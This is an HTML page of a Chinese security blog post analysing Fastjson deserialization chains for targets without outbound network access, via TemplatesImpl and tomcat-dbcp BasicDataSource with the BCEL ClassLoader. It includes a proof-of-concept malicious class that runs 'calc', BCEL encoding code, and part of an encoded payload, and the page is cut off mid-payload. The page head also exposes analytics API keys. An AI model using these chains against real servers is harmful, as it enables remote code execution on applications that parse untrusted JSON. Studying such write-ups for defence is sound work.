<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="RoboTerh"><meta name="copyright" content="RoboTerh"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>Fastjson内网利用链 | RoboTerh</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"roboterh.github.io","root":"/","title":["ROBO","TERH","BLOG","小站"],"version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"QzEMTRDcJM476WmFbFsyqtOV-MdYXbMMI","app_key":"Ovrs8D1mvkchhDyViQ6oVoQq","server_url":"https://roboterh.github.io"}</script><script defer src="/js/analytics/leancloud-visitors.js"></script><meta name="description" content="JSON.parseObject和JSON.parseparseObject 如果是JSON.parseObject(*): 没有指定class，在反序列化得时候会得到类的构造方法，所有属性得getter方法，JOSN里面非私有属性得setter方法，properties属性得getter方法调用两次 如果是JSON.parseObject(*, *.class): 指定了class，在反序列化得">
<meta property="og:type" content="article">
<meta property="og:title" content="Fastjson内网利用链">
<meta property="og:url" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="RoboTerh">
<meta property="og:description" content="JSON.parseObject和JSON.parseparseObject 如果是JSON.parseObject(*): 没有指定class，在反序列化得时候会得到类的构造方法，所有属性得getter方法，JOSN里面非私有属性得setter方法，properties属性得getter方法调用两次 如果是JSON.parseObject(*, *.class): 指定了class，在反序列化得">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403160824992.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403161657116.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403162138390.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403170024042.png">
<meta property="og:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403163941918.png">
<meta property="article:published_time" content="2022-04-03T06:31:19.000Z">
<meta property="article:modified_time" content="2022-04-03T15:56:13.292Z">
<meta property="article:author" content="RoboTerh">
<meta property="article:tag" content="反序列化漏洞">
<meta property="article:tag" content="java代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/image-20220403160824992.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="RoboTerh"><img width="96" loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/8@XK~G6IIG(3~I6J~C6M4JB.png" alt="RoboTerh"><span class="site-author-status" title="wwww我好菜">-_-</span></a><div class="site-author-name"><a href="/about/">RoboTerh</a></div><span class="site-name">RoboTerh</span><sub class="site-subtitle"></sub><div class="site-desciption">无聊的时候记录记录自己的学习啊</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">28</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">17</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/F0A770ED0C75BC233DA1034B4C80E8DA.png" title="QQ" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2865153524@qq.com" title="E-Mail" target="_blank" style="color:8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parseObject%E5%92%8CJSON-parse"><span class="toc-number">1.</span> <span class="toc-text">JSON.parseObject和JSON.parse</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#parseObject"><span class="toc-number">1.1.</span> <span class="toc-text">parseObject</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#parse"><span class="toc-number">1.2.</span> <span class="toc-text">parse</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Class-forName-%E5%92%8CClassLoader-loadClass"><span class="toc-number">2.</span> <span class="toc-text">Class.forName()和ClassLoader.loadClass()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text">不出网反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">3.1.</span> <span class="toc-text">前置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#BasicDataSource%E7%B1%BB%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">BasicDataSource类利用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84ClassLoader"><span class="toc-number">3.2.2.</span> <span class="toc-text">特殊的ClassLoader</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#POC%E7%9A%84%E6%9E%84%E9%80%A0"><span class="toc-number">3.2.3.</span> <span class="toc-text">POC的构造</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">3.3.</span> <span class="toc-text">前提</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://RoboTerh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="RoboTerh"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="RoboTerh"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">Fastjson内网利用链</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-04-03 14:31:19" itemprop="dateCreated datePublished" datetime="2022-04-03T14:31:19+08:00">2022-04-03</time></div><span class="leancloud_visitors" id="/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/" data-flag-title="Fastjson内网利用链"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Java/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Java</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">反序列化漏洞</span></a><a class="tag-item" href="/tags/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">java代码审计</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h4 id="JSON-parseObject和JSON-parse"><a href="#JSON-parseObject和JSON-parse" class="headerlink" title="JSON.parseObject和JSON.parse"></a>JSON.parseObject和JSON.parse</h4><h5 id="parseObject"><a href="#parseObject" class="headerlink" title="parseObject"></a>parseObject</h5><ol>
<li>如果是<code>JSON.parseObject(*)</code>: 没有指定class，在反序列化得时候会得到类的构造方法，所有属性得getter方法，JOSN里面非私有属性得setter方法，<code>properties</code>属性得getter方法调用<strong>两次</strong></li>
<li>如果是<code>JSON.parseObject(*, *.class)</code>: 指定了class，在反序列化得时候会得到类的构造方法，JSON里面非私有属性得<code>setter</code>方法，<code>properties</code>属性得<code>getter</code>方法</li>
</ol>
<h5 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h5><p>优先匹配其属性的<code>setter</code>方法，如果没有对应的<code>setter</code>方法，他就会调用对应属性的<code>getter</code>方法</p>
<p>但是仍然要满足一些条件才可以触发getter方法</p>
<ol>
<li>方法名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头而且第四个字母是大写的</li>
<li>无参数传入</li>
<li>返回值需要继承自<code>Collection Map AtomicBoolean AtomichInteger AtomicLong</code></li>
</ol>
<h4 id="Class-forName-和ClassLoader-loadClass"><a href="#Class-forName-和ClassLoader-loadClass" class="headerlink" title="Class.forName()和ClassLoader.loadClass()"></a>Class.forName()和ClassLoader.loadClass()</h4><p>Class.forName() 和 ClassLoader.loadClass() 这两个方法都可以用来加载目标类，但是都不支持加载原生类型，比如：int。Class.forName() 可以加载数组，而 ClassLoader.loadClass() 不能</p>
<p>forName() 默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了 JVM 虚拟机中</p>
<h4 id="不出网反序列化"><a href="#不出网反序列化" class="headerlink" title="不出网反序列化"></a>不出网反序列化</h4><h5 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h5><p>虽然说，不需要与外界互通的还有一个链子是<code>TemplatesImpl</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Gadget chain</span>
<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getOutputProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    	<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">getTransletInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    		<span class="token class-name">TemplatesImpl</span><span class="token punctuation">.</span><span class="token function">defineTransletClasses</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>之后通过defineClass()就成功加载了恶意类</p>
<p>但是要求过于苛刻了，不仅因为<code>_name</code>和<code>_bytecodes</code>是私有属性，需要加上<code>Feature.SupportNonPublicField</code></p>
<p>其中还有一个判断是要求恶意类必须是<code>AbstractTranslet</code>类的子类</p>
<p>我们知道这个利用链，在使用<code>JSON.parse</code>的情况下也可以触发漏洞，那么这里的<code>TemplatesImpl.getOutputProperties()</code>是否满足上面的条件，他的返回值是<code>Properties</code>类，是<code>Hashtable</code>的子类，而<code>Hashtable</code>类实现了<code>Map</code>接口，所以完全满足上面触发<code>getter</code>的条件</p>
<h5 id="BasicDataSource类利用"><a href="#BasicDataSource类利用" class="headerlink" title="BasicDataSource类利用"></a>BasicDataSource类利用</h5><p>恶意类是<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
<p>需要的依赖包是<code>tomcat-dbcp</code>: 是tomcat的数据库驱动组件</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Gadget chain</span>
<span class="token class-name">BasicDataSource</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token class-name">BasicDataSource</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    	<span class="token class-name">BasicDataSource</span><span class="token punctuation">.</span><span class="token function">createConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h6 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h6><p>在<code>BasicDataSource.createConnectionFactory</code>方法中</p>
<p><img src="image-20220403160824992.png" alt="image-20220403160824992" loading="lazy"></p>
<p>在这里就是实现了自定义<code>driverClassName</code>和<code>driverClassLoader</code>，如果我们能够控制这两个值，就可以实现恶意类的加载</p>
<p>通过全局搜索可以发现，在<code>BasicDataSource.createDataSource()</code>方法中调用了<code>BasicDataSource.createConnectionFactory</code>方法</p>
<p><img src="image-20220403161657116.png" alt="image-20220403161657116" loading="lazy"></p>
<p>同样可以发现在<code>BasicDataSource.getConnection</code>方法中调用了<code>BasicDataSource.createDataSource</code>方法</p>
<p><img src="image-20220403162138390.png" alt="image-20220403162138390" loading="lazy"></p>
<p>我们来看看，我们需要自定义的<code>driverClassName</code>和<code>driverClassLoader</code>是否是可控的，我们可以很明白的看出来这两个都是<code>BasicDataSource</code>类的属性，跟进他们是否都有<code>setter</code>方法，可以进行为私有属性设置值的操作，可以发现具有setter，所以我们可以自定义这两个属性</p>
<p>然后，我们看看这里的<code>getConnection</code>方法时候满足parse可以反序列化触发的条件，通过更近细节，我们可以发现，这个方法返回值为<code>Connection</code>接口，并没有继承那几个特定的接口，那难道我们就不能使用parse进行反序列化利用了嘛？</p>
<h6 id="特殊的ClassLoader"><a href="#特殊的ClassLoader" class="headerlink" title="特殊的ClassLoader"></a>特殊的ClassLoader</h6><p>那么怎么才能通过自定义的driverClassLoader进行恶意类的利用呢</p>
<p><strong>BCEL的利用</strong></p>
<p>对于<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
<p>他重写了<code>loadClass</code>方法</p>
<p><img src="image-20220403170024042.png" alt="image-20220403170024042" loading="lazy"></p>
<p>他会判断是不是以<code>$$BCEL$$</code>开头，如果是，就会将他后面的字符串进行解码，作为Class的字节码，并调用了<code>defineClass()</code>获取对应的class对象</p>
<p>所以我们将<code>dirverClassName</code>构造成经过BCEL编码的字节码，<code>dirverClassLoader</code>设置为<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code></p>
<p>构建一个恶意类</p>
<p>因为前面分析过，forName调用类的时候init是<code>true</code>所以，在类加载之后会直接执行他的static代码块里面的内容</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//EvilOfBcel</span>
<span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>classLoad</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilOfBcel</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//采用静态代码块的形式，初始化即执行恶意代码</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>

            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>进行BCEL编码并且加上<code>$$BCEL$$</code>字符串</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//TransBcel</span>
<span class="token keyword">package</span> <span class="token namespace">pers<span class="token punctuation">.</span>classLoad</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span></span><span class="token class-name">Repository</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">JavaClass</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>classfile<span class="token punctuation">.</span></span><span class="token class-name">Utility</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ClassLoader</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransBcel</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">JavaClass</span> javaClass <span class="token operator">=</span> <span class="token class-name">Repository</span><span class="token punctuation">.</span><span class="token function">lookupClass</span><span class="token punctuation">(</span><span class="token class-name">EvilOfBcel</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转化成原生字节码，javac命令也可以达到目的</span>
        <span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">Utility</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>javaClass<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将字节码转化为BCEL格式的字节码</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//生成的code还需要加上$$BCEL$$，因为com.sun.org.apache.bcel.internal.util.ClassLoader中会判断类名是否的他开头</span>

        <span class="token comment">//执行恶意类</span>
        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"$$BCEL$$"</span> <span class="token operator">+</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>
        c<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$$BCEL$$$l$<span class="token number">8</span>b$<span class="token class-name">I</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span>$<span class="token class-name">AuQ</span>$cbN$c30$<span class="token class-name">Q</span>$i$b7i$<span class="token number">93</span>$<span class="token number">86</span>$<span class="token number">94</span>B$a1$bc$df$cf$c2$<span class="token number">81</span>$<span class="token number">5</span>c$b8$<span class="token number">818</span>$<span class="token number">80</span>$<span class="token number">40</span>B$<span class="token class-name">E</span>$<span class="token number">8</span>a$u$<span class="token number">82</span>$b3kL1$<span class="token number">84</span>$a4J$<span class="token number">5</span>c$c4$lq$e6$<span class="token class-name">C</span>$<span class="token number">88</span>$<span class="token class-name">D</span>$l$c0G$n6$a1$<span class="token number">3</span>c$q$mRv$bd$b3$<span class="token number">9</span>e$d9$d9$e4$f5$ed$f9$<span class="token class-name">F</span>$c0$w$<span class="token class-name">WlX</span>$<span class="token class-name">Y</span>$b41$<span class="token number">84</span>a$<span class="token class-name">L</span>$pI$k51f$p$<span class="token number">87</span>q$<span class="token class-name">T</span>$<span class="token class-name">T</span>$s$s$<span class="token class-name">Z</span>$f2$eb$wPz$<span class="token number">83</span>$n$<span class="token number">5</span>b$<span class="token number">5d</span>$<span class="token number">3</span>aa0$b6$c23$c9P$f2T$m$<span class="token class-name">P</span>$da$d7$<span class="token class-name">N</span>$<span class="token class-name">Z</span>$j$f3$<span class="token number">86</span>OH$d9$<span class="token class-name">L</span>$<span class="token class-name">F</span>$f7Ox$a4$<span class="token number">92</span>$ba$<span class="token class-name">D</span>$g$faB$c5$<span class="token class-name">M</span>$a3$<span class="token number">5</span>eKF$b1$x$<span class="token number">7</span>c$k$c7$<span class="token number">5</span>e$c8$cf$dc$ed$h$e5$d7$ce7$<span class="token number">85</span>$f4$d7$<span class="token class-name">Y</span>$acu$e1wf0$e2T$bcK$<span class="token number">7</span>e$c3$<span class="token number">5d</span>$<span class="token class-name">V</span>$ba$bb$b5$ed$<span class="token number">5</span>b$n$<span class="token number">5</span>bZ$<span class="token number">85</span>$<span class="token class-name">B</span>$<span class="token number">5d</span>$x$d65$XW$fb$bc$<span class="token number">95</span>j$<span class="token number">93</span>M$<span class="token class-name">G</span>$bb$k$b6$p$nwT2$ab$f4$z$ba$<span class="token number">92</span>$u8$u$c061$e5$<span class="token number">60</span>$g3d$<span class="token number">85</span>$dc$<span class="token class-name">J</span>$<span class="token class-name">H</span>$b3$<span class="token number">98</span>c$e8$fbc$<span class="token number">82</span>$<span class="token number">83</span>y$d8$<span class="token class-name">M</span>$c3$ff$<span class="token number">3</span>ae$e8Ii$<span class="token number">3</span>e$<span class="token class-name">P</span>$<span class="token number">9</span>an$adq$v$<span class="token number">85f</span>$e8$fd$<span class="token number">86</span>$<span class="token number">8</span>e$da$<span class="token number">81</span>V$d7d$c4nJ$fdUT$aaK$de$af$<span class="token number">3</span>b$b4$<span class="token number">8d</span>$no$a5$<span class="token number">60</span>X$ac$fe$e8$d6u$a4$<span class="token number">82</span>$e6$daO$c2a$<span class="token class-name">U</span>$<span class="token class-name">K</span>$<span class="token class-name">Z</span>$c7D$u$b5$a8$a9$d3op$iq$ni$x$<span class="token number">93</span>$<span class="token number">7</span>e$<span class="token number">5</span>e$f2d$c0$<span class="token number">92</span>$<span class="token number">5d</span>$vvQ$e5Rf$<span class="token number">94</span>s$cb$<span class="token number">8f</span>$<span class="token number">60</span>$f7i$db$a1$<span class="token number">98</span>$ff$AQ$a4$e8t$ce$dd$uQ$b6$d0$f3E$e6$a9$YP$<span class="token number">7</span>eB$a6$<span class="token number">9</span>c$<span class="token number">7d</span>$<span class="token number">80</span>qz$<span class="token class-name">Hko</span>$f9$<span class="token class-name">B</span>$f9$fb$<span class="token class-name">U</span>$_$Q7$<span class="token number">87l</span>$aa8$<span class="token number">40</span>$t$<span class="token class-name">Q</span>$b3$<span class="token 